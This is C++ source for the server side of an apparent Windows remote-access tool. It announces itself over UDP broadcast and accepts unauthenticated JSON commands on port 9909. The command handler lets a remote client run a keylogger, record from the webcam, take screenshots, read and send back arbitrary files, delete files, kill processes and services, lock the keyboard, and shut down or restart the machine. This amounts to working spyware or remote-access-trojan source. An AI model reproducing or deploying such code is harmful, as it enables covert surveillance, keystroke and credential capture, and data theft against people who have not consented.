﻿#include "socket.h"
#include "commands.h"
#include "process.h"

HHOOK keyboardHook = nullptr;
BOOL isConnected = false;

WSADATA initializeWinsock() {
    WSADATA ws;
    if (WSAStartup(MAKEWORD(2, 2), &ws) < 0) {
        cout << "WSA failed to initialize" << endl;
    }

    return ws;
}

SOCKET initializeSocket() {
    SOCKET nSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (nSocket < 0) {
        cout << "The Socket not opened" << endl;
    }
    else
        cout << "The Socket opened successfully" << endl;

    return nSocket;
}

sockaddr_in initializeServerSocket() {
    sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(9909);
    server.sin_addr.s_addr = INADDR_ANY;
    memset(&(server.sin_zero), 0, 8);

    return server;
}

void bindAndListen(SOCKET& nSocket, sockaddr_in& server) {
    int nRet = 0;
    nRet = ::bind(nSocket, (sockaddr*)&server, sizeof(sockaddr));

    if (nRet < 0) {
        cout << "Failed to bind to local port" << endl;
        return;
    }
    else cout << "Successfully bind to local port" << endl;

    // listen the request from client 
    nRet = listen(nSocket, 5);
    if (nRet < 0) {
        cout << "Failed to start listen to local port" << endl;
    }
    else cout << "Started listening to local port" << endl;
}

string getLocalIPAddress() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        cerr << "Error getting hostname: " << WSAGetLastError() << endl;
        return "";
    }

    struct addrinfo hints, * info;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostname, NULL, &hints, &info) != 0) {
        cerr << "Error getting local IP: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* addr = (sockaddr_in*)info->ai_addr;
    char ipStr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(addr->sin_addr), ipStr, INET_ADDRSTRLEN);
    freeaddrinfo(info);

    return string(ipStr);
}


void sendBroadcast() {
    SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        cout << "Failed to create UDP socket: " << WSAGetLastError() << endl;
        return;
    }
    cout << "UDP socket created successfully for broadcasting" << endl;

    // enable broadcast
    BOOL broadcastEnable = TRUE;
    if (setsockopt(udpSocket, SOL_SOCKET, SO_BROADCAST, (char*)&broadcastEnable, sizeof(broadcastEnable)) < 0) {
        cout << "Failed to enable broadcast: " << WSAGetLastError() << endl;
        closesocket(udpSocket);
        return;
    }

    sockaddr_in broadcastAddr;
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(9909);
    broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;

    string serverIP = getLocalIPAddress();
    if (serverIP.empty()) {
        cout << "Unable to get server IP address" << endl;
        closesocket(udpSocket);
        return;
    }

    string message = "Server_IP=" + serverIP + ";Port=9909";
    cout << message << endl;
    cout << "Broadcasting server information..." << endl;
    while (!isConnected) {
        sendto(udpSocket, message.c_str(), (int)strlen(message.c_str()), 0,
            (sockaddr*)&broadcastAddr, sizeof(broadcastAddr));
        Sleep(5000);
    }

    cout << "Broadcast stopped." << endl;
    closesocket(udpSocket);
}

SOCKET acceptRequestFromClient(SOCKET nSocket) {
    SOCKET clientSocket;
    sockaddr_in client;
    int clientSize = sizeof(client);

    clientSocket = accept(nSocket, (sockaddr*)&client, &clientSize);

    if (clientSocket < 0) {
        cout << "Failed to accept connection" << endl;
        return EXIT_FAILURE;
    }
    else cout << "Client connected successfully" << endl;

    cout << endl;

    return clientSocket;
}

void sendResponse(SOCKET& clientSocket, string jsonResponse) {
    int jsonSize = (int)jsonResponse.size();

    // send the size of the JSON
    int result = send(clientSocket, reinterpret_cast<char*>(&jsonSize), sizeof(jsonSize), 0);
    if (result == SOCKET_ERROR) {
        cout << "Failed to send JSON size, error: " << WSAGetLastError() << endl;
        return;
    }

    // send the content of the JSON
    int bytesSent = 0;
    while (bytesSent < jsonSize) {
        int bytesToSend = min(jsonSize - bytesSent, 1024);
        result = send(clientSocket, jsonResponse.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send JSON data, error: " << WSAGetLastError() << endl;
            break;
        }
        bytesSent += result;
    }
}

void processRequests(SOCKET& clientSocket, SOCKET& nSocket) {
    string receiveBuffer, sendBuffer;

    while (true) {
        receiveBuffer.resize(512);

        int recvResult = recv(clientSocket, &receiveBuffer[0], (int)receiveBuffer.size(), 0);

        if (recvResult <= 0) {
            cout << "Failed to receive data from client" << endl;
            break;
        }
        else {
            receiveBuffer.resize(recvResult);

            json j = json::parse(receiveBuffer);

			// check if the client wants to end the program
            if (j.contains("title")) {
                string command = j.at("title");
                if (command == DISCONNECT) {
                    cout << "Exit command received. Closing connection" << endl;
                    break;
				}
			}

            thread([&clientSocket, receiveBuffer]() {
                processRequest(clientSocket, receiveBuffer);
                }).detach();
        }

    }
}

void closeConnection(SOCKET& clientSocket, SOCKET& nSocket) {
    // close connected with client
    closesocket(clientSocket);

    // close socket server
    closesocket(nSocket);
    WSACleanup();
}

void processRequest(SOCKET& clientSocket, string request) {
	// parse the request
    json j = json::parse(request);

    string response = "";
	json jsonResponse;

    if (j.contains("title")) {
		string command = j.at("title");
		cout << "Processing request: " << command << endl;
        if (command == START_APP) {
            if (j.contains("nameObject")) {
                response = startApp(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == STOP_APP) {
            if (j.contains("nameObject")) {
                response = stopApp(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == LIST_APP) {
            jsonResponse = listApp();
			sendResponse(clientSocket, jsonResponse.dump());
			if (jsonResponse["status"] == "OK") {
				sendFile(clientSocket, DATA_FILE);
                cout << "App list sent successfully" << endl;
			}
        }
        else if (command == START_SERVICE) {
            if (j.contains("nameObject")) {
                response = startService(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == STOP_SERVICE) {
            if (j.contains("nameObject")) {
                response = stopService(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == LIST_SERVICE) {
            jsonResponse = listService();
            sendResponse(clientSocket, jsonResponse.dump());
            if (jsonResponse["status"] == "OK") {
                sendFile(clientSocket, DATA_FILE);
				cout << "Service list sent successfully" << endl;
            }
        }
        else if (command == LIST_PROCESS) {
            jsonResponse = listProcess();
            sendResponse(clientSocket, jsonResponse.dump());
            if (jsonResponse["status"] == "OK") {
                sendFile(clientSocket, DATA_FILE);
                cout << "Process list sent successfully" << endl;
            }
        }
        else if (command == GET_FILE) {
            string fileName = j.at("nameObject");

			ifstream file(fileName, ios::binary);
			if (!file.is_open()) {
				jsonResponse["status"] = "FAILED";
				jsonResponse["result"] = "Failed to open file, check if the file path exists and try again";
			}
            else {
                jsonResponse["status"] = "OK";
                jsonResponse["result"] = "File sent successfully";
            }
            sendResponse(clientSocket, jsonResponse.dump());
            
            sendFile(clientSocket, fileName);
        }
        else if (command == COPY_FILE) {
            response = copyFile(j.at("source"), j.at("destination"));
            sendResponse(clientSocket, response);
        }
        else if (command == DELETE_FILE) {
            string filePath = j.at("nameObject");

            response = deleteFile(filePath);
            sendResponse(clientSocket, response);
        }
        else if (command == TAKE_SCREENSHOT) {
            if (takeScreenshot()) {
                jsonResponse["status"] = "OK";
                jsonResponse["result"] = "Successfully screenshot";
            }
            else {
                jsonResponse["status"] = "FAILED";
                jsonResponse["result"] = "Failed to screenshot";
            }

            sendResponse(clientSocket, jsonResponse.dump());
            sendFile(clientSocket, "screenShot.png");
        }
        else if (command == KEYLOGGER) {
            int duration = stoi((string)j.at("nameObject"));

            jsonResponse = keylogger(duration);
            sendResponse(clientSocket, jsonResponse.dump());
            if (jsonResponse["status"] == "OK") {
                sendFile(clientSocket, DATA_FILE);
                cout << "Key list sent successfully" << endl;
            }
        }
        else if (command == LOCK_KEYBOARD) {
            bool flag = false;
            response = lockKey(flag);
            sendResponse(clientSocket, response);
            cout << "Request processed" << endl << endl;

            if (flag) runKeyLockingLoop();
        }
        else if (command == UNLOCK_KEYBOARD) {
            response = unlockKey();
            sendResponse(clientSocket, response);
        }
        else if (command == SHUTDOWN) {
            jsonResponse["status"] = "OK";
            jsonResponse["result"] = "Successfully shutdown computer";
            sendResponse(clientSocket, jsonResponse.dump());
            shutdown();
        }
        else if (command == RESTART) {
            jsonResponse["status"] = "OK";
            jsonResponse["result"] = "Successfully restart computer";
            sendResponse(clientSocket, jsonResponse.dump());
            restart();
        }
        else if (command == LIST_DIRECTORY_TREE) {
            jsonResponse = listDirectoryTree();
            sendResponse(clientSocket, jsonResponse.dump());
            if (jsonResponse["status"] == "OK") {
                sendFile(clientSocket, DATA_FILE);
                cout << "Directory tree list sent successfully" << endl;
            }
        }
        else if (command == TURN_ON_WEBCAM) {
            response = turnOnWebcam();
            sendResponse(clientSocket, response);
        }
        else if (command == TURN_OFF_WEBCAM) {
            jsonResponse = turnOffWebcam();
            sendResponse(clientSocket, jsonResponse.dump());
            if (jsonResponse["status"] == "OK") {
                sendFile(clientSocket, VIDEO_FILE);
                cout << "Record sent successfully" << endl;
            }
        }
		cout << "Request processed" << endl << endl;
    }
}
